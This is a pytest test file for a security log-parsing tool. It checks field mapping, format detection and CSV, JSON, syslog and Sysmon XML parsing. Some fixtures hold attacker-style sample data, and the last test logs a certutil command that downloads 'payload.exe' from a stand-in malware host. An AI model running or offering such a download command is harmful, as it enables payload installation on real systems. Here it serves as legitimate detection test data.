"""Tests for log file parsers and field mapping."""

import json
import os
import tempfile
from pathlib import Path

import pytest

from nabla.parsers.field_map import (
    auto_detect_fields,
    apply_column_map,
    parse_column_map_string,
    infer_log_type,
    FIELD_ALIASES,
)
from nabla.parsers import parse_file, normalize_entries, detect_format


# --- field_map.py ---

def test_auto_detect_common_columns():
    """Common SIEM column names are mapped to canonical fields."""
    columns = ["User_Name", "Src_IP", "Timestamp", "Action", "EventCode"]
    mapping = auto_detect_fields(columns)
    assert mapping["user"] == "User_Name"
    assert mapping["source_ip"] == "Src_IP"
    assert mapping["timestamp"] == "Timestamp"
    assert mapping["action"] == "Action"
    assert mapping["event_code"] == "EventCode"


def test_auto_detect_exact_names():
    """Exact canonical names are mapped directly."""
    columns = ["user", "source_ip", "timestamp", "process", "host"]
    mapping = auto_detect_fields(columns)
    assert mapping["user"] == "user"
    assert mapping["source_ip"] == "source_ip"


def test_auto_detect_sysmon_fields():
    """Sysmon-style field names (Image, ParentImage, CommandLine) are mapped."""
    columns = ["Image", "ParentImage", "CommandLine", "User", "UtcTime"]
    mapping = auto_detect_fields(columns)
    assert mapping["process"] == "Image"
    assert mapping["parent_process"] == "ParentImage"
    assert mapping["command_line"] == "CommandLine"
    assert mapping["user"] == "User"
    assert mapping["timestamp"] == "UtcTime"


def test_auto_detect_no_match():
    """Unknown columns are not mapped."""
    columns = ["custom_field_1", "custom_field_2"]
    mapping = auto_detect_fields(columns)
    assert len(mapping) == 0


def test_auto_detect_case_insensitive():
    """Column name matching is case-insensitive."""
    columns = ["USERNAME", "SRC_IP", "TIMESTAMP"]
    mapping = auto_detect_fields(columns)
    assert "user" in mapping
    assert "source_ip" in mapping
    assert "timestamp" in mapping


def test_apply_column_map_override():
    """User column map overrides auto-detected mappings."""
    auto = {"user": "User_Name", "source_ip": "Src_IP"}
    user = {"user": "Account"}
    merged = apply_column_map(auto, user)
    assert merged["user"] == "Account"  # overridden
    assert merged["source_ip"] == "Src_IP"  # preserved


def test_apply_column_map_new_field():
    """User column map can add mappings not auto-detected."""
    auto = {"user": "User_Name"}
    user = {"process": "App_Name"}
    merged = apply_column_map(auto, user)
    assert merged["process"] == "App_Name"


def test_parse_column_map_string():
    """CLI --map string is parsed correctly."""
    result = parse_column_map_string("user=UserName,source_ip=Src_IP")
    assert result == {"user": "UserName", "source_ip": "Src_IP"}


def test_parse_column_map_string_empty():
    """Empty string returns empty dict."""
    assert parse_column_map_string("") == {}


def test_parse_column_map_string_invalid():
    """Invalid format raises ValueError."""
    with pytest.raises(ValueError, match="Invalid column mapping"):
        parse_column_map_string("no_equals_sign")


def test_parse_column_map_string_empty_value():
    """Empty key or value raises ValueError."""
    with pytest.raises(ValueError, match="non-empty"):
        parse_column_map_string("=value")


def test_infer_log_type_dns():
    """Domain field infers dns log type."""
    entries = [{"domain": "evil.com", "timestamp": "2024-01-01T10:00:00Z"}]
    assert infer_log_type(entries) == "dns"


def test_infer_log_type_network():
    """source_ip + dest_ip infers network log type."""
    entries = [{"source_ip": "10.0.0.1", "dest_ip": "10.0.0.2", "timestamp": "2024-01-01T10:00:00Z"}]
    assert infer_log_type(entries) == "network"


def test_infer_log_type_endpoint():
    """Process field infers endpoint log type."""
    entries = [{"process": "cmd.exe", "timestamp": "2024-01-01T10:00:00Z"}]
    assert infer_log_type(entries) == "endpoint"


def test_infer_log_type_auth():
    """Action with login infers auth log type."""
    entries = [{"action": "login_success", "timestamp": "2024-01-01T10:00:00Z"}]
    assert infer_log_type(entries) == "auth"


def test_infer_log_type_default():
    """Unknown fields default to auth."""
    entries = [{"custom_field": "value"}]
    assert infer_log_type(entries) == "auth"


def test_infer_log_type_empty():
    """Empty entries default to auth."""
    assert infer_log_type([]) == "auth"


# --- csv_parser.py ---

def test_parse_csv_basic():
    """CSV file is parsed into list of dicts."""
    from nabla.parsers.csv_parser import parse_csv

    with tempfile.NamedTemporaryFile(mode="w", suffix=".csv", delete=False) as f:
        f.write("user,source_ip,action,timestamp\n")
        f.write("alice,10.0.0.1,login_success,2024-01-01T10:00:00Z\n")
        f.write("bob,10.0.0.2,login_failure,2024-01-01T11:00:00Z\n")
        f.name
    try:
        entries = parse_csv(Path(f.name))
        assert len(entries) == 2
        assert entries[0]["user"] == "alice"
        assert entries[1]["action"] == "login_failure"
    finally:
        os.unlink(f.name)


# --- Format detection for ambiguous extensions ---

class TestFormatDetection:
    """Test that .txt and .log files with XML content are detected as XML."""

    def test_txt_with_xml_content_detected_as_xml(self):
        """A .txt file containing XML should be detected as XML format."""
        xml_content = """<?xml version="1.0" encoding="utf-8"?>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1</EventID>
  </System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
  </EventData>
</Event>"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as f:
            f.write(xml_content)
            path = f.name
        try:
            fmt = detect_format(Path(path))
            assert fmt == "xml", f"Expected 'xml' but got '{fmt}' for .txt file with XML content"
        finally:
            os.unlink(path)

    def test_txt_with_json_content_detected_as_json(self):
        """A .txt file containing JSON should be detected as JSON format."""
        json_content = '[{"user": "admin", "action": "login"}]'
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as f:
            f.write(json_content)
            path = f.name
        try:
            fmt = detect_format(Path(path))
            assert fmt == "json", f"Expected 'json' but got '{fmt}' for .txt file with JSON content"
        finally:
            os.unlink(path)

    def test_txt_with_syslog_content_detected_as_text(self):
        """A .txt file containing syslog text should be detected as text format."""
        syslog_content = "Jan  1 10:00:00 host sshd[123]: Failed password for admin"
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as f:
            f.write(syslog_content)
            path = f.name
        try:
            fmt = detect_format(Path(path))
            assert fmt == "text", f"Expected 'text' but got '{fmt}' for .txt file with syslog content"
        finally:
            os.unlink(path)

    def test_xml_extension_still_xml(self):
        """A .xml file should still be detected as XML regardless of content."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False, encoding="utf-8") as f:
            f.write("<Event><System><EventID>1</EventID></System></Event>")
            path = f.name
        try:
            fmt = detect_format(Path(path))
            assert fmt == "xml"
        finally:
            os.unlink(path)

    def test_log_with_xml_content_detected_as_xml(self):
        """A .log file containing XML should be detected as XML format."""
        xml_content = '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>13</EventID></System></Event>'
        with tempfile.NamedTemporaryFile(mode="w", suffix=".log", delete=False, encoding="utf-8") as f:
            f.write(xml_content)
            path = f.name
        try:
            fmt = detect_format(Path(path))
            assert fmt == "xml", f"Expected 'xml' but got '{fmt}' for .log file with XML content"
        finally:
            os.unlink(path)


def test_parse_csv_tsv():
    """TSV file is auto-detected and parsed."""
    from nabla.parsers.csv_parser import parse_csv

    with tempfile.NamedTemporaryFile(mode="w", suffix=".tsv", delete=False) as f:
        f.write("user\tsource_ip\taction\n")
        f.write("alice\t10.0.0.1\tlogin_success\n")
        f.name
    try:
        entries = parse_csv(Path(f.name))
        assert len(entries) == 1
        assert entries[0]["user"] == "alice"
    finally:
        os.unlink(f.name)


def test_parse_csv_max_entries():
    """CSV parsing respects max_entries limit."""
    from nabla.parsers.csv_parser import parse_csv

    with tempfile.NamedTemporaryFile(mode="w", suffix=".csv", delete=False) as f:
        f.write("user,action\n")
        for i in range(10):
            f.write(f"user_{i},login\n")
        f.name
    try:
        entries = parse_csv(Path(f.name), max_entries=3)
        assert len(entries) == 3
    finally:
        os.unlink(f.name)


def test_parse_csv_not_found():
    """Missing file raises FileNotFoundError."""
    from nabla.parsers.csv_parser import parse_csv

    with pytest.raises(FileNotFoundError):
        parse_csv(Path("/nonexistent/file.csv"))


def test_parse_csv_empty_file():
    """Empty file raises ValueError."""
    from nabla.parsers.csv_parser import parse_csv

    with tempfile.NamedTemporaryFile(mode="w", suffix=".csv", delete=False) as f:
        f.write("")
        f.name
    try:
        with pytest.raises(ValueError, match="empty"):
            parse_csv(Path(f.name))
    finally:
        os.unlink(f.name)


# --- json_parser.py ---

def test_parse_json_array():
    """JSON array is parsed into list of dicts."""
    from nabla.parsers.json_parser import parse_json

    data = [
        {"user": "alice", "action": "login_success"},
        {"user": "bob", "action": "login_failure"},
    ]
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
        json.dump(data, f)
        f.name
    try:
        entries = parse_json(Path(f.name))
        assert len(entries) == 2
        assert entries[0]["user"] == "alice"
    finally:
        os.unlink(f.name)


def test_parse_json_single_object():
    """Single JSON object is wrapped in a list."""
    from nabla.parsers.json_parser import parse_json

    data = {"user": "alice", "action": "login_success"}
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
        json.dump(data, f)
        f.name
    try:
        entries = parse_json(Path(f.name))
        assert len(entries) == 1
        assert entries[0]["user"] == "alice"
    finally:
        os.unlink(f.name)


def test_parse_jsonl():
    """JSONL file (one object per line) is parsed."""
    from nabla.parsers.json_parser import parse_json

    lines = [
        '{"user": "alice", "action": "login_success"}',
        '{"user": "bob", "action": "login_failure"}',
    ]
    with tempfile.NamedTemporaryFile(mode="w", suffix=".jsonl", delete=False) as f:
        f.write("\n".join(lines))
        f.name
    try:
        entries = parse_json(Path(f.name))
        assert len(entries) == 2
        assert entries[1]["user"] == "bob"
    finally:
        os.unlink(f.name)


def test_parse_jsonl_skips_invalid():
    """JSONL parser skips invalid lines."""
    from nabla.parsers.json_parser import parse_json

    lines = [
        '{"user": "alice", "action": "login_success"}',
        'not valid json',
        '{"user": "bob", "action": "login_failure"}',
    ]
    with tempfile.NamedTemporaryFile(mode="w", suffix=".jsonl", delete=False) as f:
        f.write("\n".join(lines))
        f.name
    try:
        entries = parse_json(Path(f.name))
        assert len(entries) == 2
    finally:
        os.unlink(f.name)


def test_parse_json_max_entries():
    """JSON parsing respects max_entries limit."""
    from nabla.parsers.json_parser import parse_json

    data = [{"user": f"user_{i}"} for i in range(10)]
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
        json.dump(data, f)
        f.name
    try:
        entries = parse_json(Path(f.name), max_entries=3)
        assert len(entries) == 3
    finally:
        os.unlink(f.name)


# --- text_parser.py ---

def test_parse_text_syslog_rfc3164():
    """RFC 3164 syslog format is parsed."""
    from nabla.parsers.text_parser import parse_text

    with tempfile.NamedTemporaryFile(mode="w", suffix=".log", delete=False) as f:
        f.write("Jan 15 10:00:00 WS01 sshd[1234]: Failed password for admin from 10.0.0.1 port 22\n")
        f.write("Jan 15 10:01:00 WS01 sshd[1234]: Accepted password for alice from 10.0.0.2 port 22\n")
        f.name
    try:
        entries = parse_text(Path(f.name))
        assert len(entries) == 2
        assert entries[0]["host"] == "WS01"
        assert entries[0]["action"] == "login_failure"
        assert entries[0]["user"] == "admin"
        assert entries[0]["source_ip"] == "10.0.0.1"
        assert entries[1]["action"] == "login_success"
    finally:
        os.unlink(f.name)


def test_parse_text_kv_format():
    """Key-value format lines are parsed."""
    from nabla.parsers.text_parser import parse_text

    with tempfile.NamedTemporaryFile(mode="w", suffix=".log", delete=False) as f:
        f.write("user=alice action=login_success source_ip=10.0.0.1 timestamp=2024-01-01T10:00:00Z\n")
        f.name
    try:
        entries = parse_text(Path(f.name))
        assert len(entries) == 1
        assert entries[0]["user"] == "alice"
        assert entries[0]["action"] == "login_success"
    finally:
        os.unlink(f.name)


def test_parse_text_fallback():
    """Unparseable lines are stored as message."""
    from nabla.parsers.text_parser import parse_text

    with tempfile.NamedTemporaryFile(mode="w", suffix=".log", delete=False) as f:
        f.write("Some random log line that doesn't match any pattern\n")
        f.name
    try:
        entries = parse_text(Path(f.name))
        assert len(entries) == 1
        assert entries[0]["message"] == "Some random log line that doesn't match any pattern"
    finally:
        os.unlink(f.name)


def test_parse_text_empty():
    """Empty file raises ValueError."""
    from nabla.parsers.text_parser import parse_text

    with tempfile.NamedTemporaryFile(mode="w", suffix=".log", delete=False) as f:
        f.write("")
        f.name
    try:
        with pytest.raises(ValueError, match="Could not parse"):
            parse_text(Path(f.name))
    finally:
        os.unlink(f.name)


# --- xml_parser.py ---

def test_parse_xml_sysmon():
    """Sysmon XML with EventData is parsed."""
    from nabla.parsers.xml_parser import parse_xml

    xml_content = """<?xml version="1.0" encoding="utf-8"?>
<Events>
  <Event>
    <System>
      <EventID>1</EventID>
      <TimeCreated SystemTime="2024-01-01T10:00:00.000Z"/>
      <Computer>WS01</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
      <Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\winword.exe</Data>
      <Data Name="CommandLine">cmd /c whoami</Data>
      <Data Name="User">DOMAIN\\admin</Data>
    </EventData>
  </Event>
</Events>"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as f:
        f.write(xml_content)
        f.name
    try:
        entries = parse_xml(Path(f.name))
        assert len(entries) == 1
        assert entries[0]["event_code"] == "1"
        assert entries[0]["host"] == "WS01"
        assert entries[0]["Image"] == "C:\\Windows\\System32\\cmd.exe"
        assert entries[0]["ParentImage"] == "C:\\Program Files\\Microsoft Office\\winword.exe"
        assert entries[0]["CommandLine"] == "cmd /c whoami"
    finally:
        os.unlink(f.name)


def test_parse_xml_sysmon_fragments():
    """Sysmon XML fragments (no root element, one Event per line) are parsed."""
    from nabla.parsers.xml_parser import parse_xml

    # Real-world Sysmon export format: no <Events> wrapper, each <Event> is standalone
    ns = "http://schemas.microsoft.com/win/2004/08/events/event"
    xml_content = f"""<Event xmlns='{ns}'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{{5770385f-c22a-43e0-bf4c-06f5698ffbd9}}'/><EventID>1</EventID><TimeCreated SystemTime='2024-01-01T10:00:00.000Z'/><Computer>WS01</Computer></System><EventData><Data Name='Image'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='User'>DOMAIN\\admin</Data></EventData></Event>
<Event xmlns='{ns}'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{{5770385f-c22a-43e0-bf4c-06f5698ffbd9}}'/><EventID>3</EventID><TimeCreated SystemTime='2024-01-01T10:01:00.000Z'/><Computer>WS01</Computer></System><EventData><Data Name='Image'>C:\\Windows\\System32\\svchost.exe</Data><Data Name='DestinationPort'>443</Data></EventData></Event>
"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as f:
        f.write(xml_content)
        f.name
    try:
        entries = parse_xml(Path(f.name))
        assert len(entries) == 2
        assert entries[0]["event_code"] == "1"
        assert entries[0]["host"] == "WS01"
        assert entries[0]["Image"] == "C:\\Windows\\System32\\cmd.exe"
        assert entries[0]["User"] == "DOMAIN\\admin"
        assert entries[1]["event_code"] == "3"
    finally:
        os.unlink(f.name)


def test_parse_xml_flat():
    """Flat XML (row/field) is parsed."""
    from nabla.parsers.xml_parser import parse_xml

    xml_content = """<?xml version="1.0"?>
<rows>
  <row>
    <user>alice</user>
    <source_ip>10.0.0.1</source_ip>
    <action>login_success</action>
  </row>
</rows>"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as f:
        f.write(xml_content)
        f.name
    try:
        entries = parse_xml(Path(f.name))
        assert len(entries) == 1
        assert entries[0]["user"] == "alice"
        assert entries[0]["source_ip"] == "10.0.0.1"
    finally:
        os.unlink(f.name)


def test_parse_xml_empty():
    """XML with no events raises ValueError."""
    from nabla.parsers.xml_parser import parse_xml

    xml_content = """<?xml version="1.0"?>
<Events></Events>"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as f:
        f.write(xml_content)
        f.name
    try:
        with pytest.raises(ValueError, match="No parseable"):
            parse_xml(Path(f.name))
    finally:
        os.unlink(f.name)


def test_parse_xml_invalid():
    """Invalid XML raises ValueError."""
    from nabla.parsers.xml_parser import parse_xml

    with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as f:
        f.write("not xml at all")
        f.name
    try:
        with pytest.raises(ValueError, match="Could not parse"):
            parse_xml(Path(f.name))
    finally:
        os.unlink(f.name)


# --- __init__.py (parse_file + normalize_entries) ---

def test_parse_file_csv():
    """parse_file dispatches to CSV parser."""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".csv", delete=False) as f:
        f.write("user,source_ip,action,timestamp\n")
        f.write("alice,10.0.0.1,login_success,2024-01-01T10:00:00Z\n")
        f.name
    try:
        entries = parse_file(f.name)
        assert len(entries) == 1
        assert entries[0]["user"] == "alice"
    finally:
        os.unlink(f.name)


def test_parse_file_json():
    """parse_file dispatches to JSON parser."""
    data = [{"user": "alice", "action": "login_success"}]
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
        json.dump(data, f)
        f.name
    try:
        entries = parse_file(f.name)
        assert len(entries) == 1
    finally:
        os.unlink(f.name)


def test_parse_file_format_hint():
    """Format hint overrides auto-detection."""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".dat", delete=False) as f:
        f.write("user,action\nalice,login\n")
        f.name
    try:
        entries = parse_file(f.name, format_hint="csv")
        assert len(entries) == 1
    finally:
        os.unlink(f.name)


def test_parse_file_unknown_format():
    """Unknown format raises ValueError."""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".xyz", delete=False) as f:
        f.write("data")
        f.name
    try:
        with pytest.raises(ValueError, match="Unknown format"):
            parse_file(f.name, format_hint="xyz")
    finally:
        os.unlink(f.name)


def test_detect_format_extensions():
    """File extensions map to correct formats."""
    assert detect_format(Path("logs.csv")) == "csv"
    assert detect_format(Path("logs.tsv")) == "csv"
    assert detect_format(Path("logs.json")) == "json"
    assert detect_format(Path("logs.jsonl")) == "jsonl"
    assert detect_format(Path("logs.xml")) == "xml"
    assert detect_format(Path("logs.log")) == "text"
    assert detect_format(Path("logs.txt")) == "text"


def test_detect_format_content_heuristic():
    """Content-based format detection works."""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".dat", delete=False) as f:
        f.write('<?xml version="1.0"?>\n<Events></Events>')
        f.name
    try:
        assert detect_format(Path(f.name)) == "xml"
    finally:
        os.unlink(f.name)


def test_normalize_entries_basic():
    """Raw entries are normalized to canonical schema."""
    raw = [
        {"User_Name": "alice", "Src_IP": "10.0.0.1", "Action": "login_success", "Timestamp": "2024-01-01T10:00:00Z"},
    ]
    normalized = normalize_entries(raw, log_type="auth")
    assert len(normalized) == 1
    assert normalized[0]["user"] == "alice"
    assert normalized[0]["source_ip"] == "10.0.0.1"
    assert normalized[0]["action"] == "login_success"
    assert normalized[0]["type"] == "auth"


def test_normalize_entries_with_column_map():
    """User column map overrides auto-detected fields."""
    raw = [
        {"Account": "alice", "IP": "10.0.0.1"},
    ]
    column_map = {"user": "Account", "source_ip": "IP"}
    normalized = normalize_entries(raw, log_type="auth", column_map=column_map)
    assert normalized[0]["user"] == "alice"
    assert normalized[0]["source_ip"] == "10.0.0.1"


def test_normalize_entries_infer_type():
    """Log type is inferred when not specified."""
    raw = [
        {"domain": "evil.com", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    normalized = normalize_entries(raw)
    assert normalized[0]["type"] == "dns"


def test_normalize_entries_empty():
    """Empty input returns empty list."""
    assert normalize_entries([]) == []


def test_normalize_entries_epoch_timestamp():
    """Epoch timestamps are converted to ISO format."""
    raw = [
        {"user": "alice", "timestamp": "1704067200"},
    ]
    normalized = normalize_entries(raw, log_type="auth")
    # Should be converted to ISO format
    assert "T" in normalized[0]["timestamp"] or "-" in normalized[0]["timestamp"]


def test_normalize_entries_preserves_unmapped():
    """Unmapped fields are preserved in the output."""
    raw = [
        {"user": "alice", "custom_field": "value"},
    ]
    normalized = normalize_entries(raw, log_type="auth")
    assert normalized[0]["custom_field"] == "value"


def test_normalize_entries_sysmon_xml():
    """Sysmon XML fields are normalized through auto-detect."""
    raw = [
        {"Image": "cmd.exe", "ParentImage": "winword.exe", "CommandLine": "cmd /c whoami", "User": "admin"},
    ]
    normalized = normalize_entries(raw, log_type="endpoint")
    assert normalized[0]["process"] == "cmd.exe"
    assert normalized[0]["parent_process"] == "winword.exe"
    assert normalized[0]["command_line"] == "cmd /c whoami"
    assert normalized[0]["user"] == "admin"


def test_parse_file_not_found():
    """Missing file raises FileNotFoundError."""
    with pytest.raises(FileNotFoundError):
        parse_file("/nonexistent/file.csv")


def test_parse_file_sysmon_xml_end_to_end():
    """End-to-end: Sysmon XML → parse → normalize → canonical schema."""
    xml_content = """<?xml version="1.0" encoding="utf-8"?>
<Events>
  <Event>
    <System>
      <EventID>1</EventID>
      <TimeCreated SystemTime="2024-01-01T10:00:00.000Z"/>
      <Computer>WS01</Computer>
    </System>
    <EventData>
      <Data Name="Image">certutil.exe</Data>
      <Data Name="ParentImage">powershell.exe</Data>
      <Data Name="CommandLine">certutil -urlcache -f http://malware.com/payload.exe C:\\temp\\p.exe</Data>
      <Data Name="User">DOMAIN\\admin</Data>
    </EventData>
  </Event>
</Events>"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as f:
        f.write(xml_content)
        f.name
    try:
        raw = parse_file(f.name)
        normalized = normalize_entries(raw, log_type="endpoint")
        assert len(normalized) == 1
        assert normalized[0]["process"] == "certutil.exe"
        assert normalized[0]["parent_process"] == "powershell.exe"
        assert normalized[0]["command_line"] == "certutil -urlcache -f http://malware.com/payload.exe C:\\temp\\p.exe"
        assert normalized[0]["user"] == "DOMAIN\\admin"
        assert normalized[0]["type"] == "endpoint"
    finally:
        os.unlink(f.name)
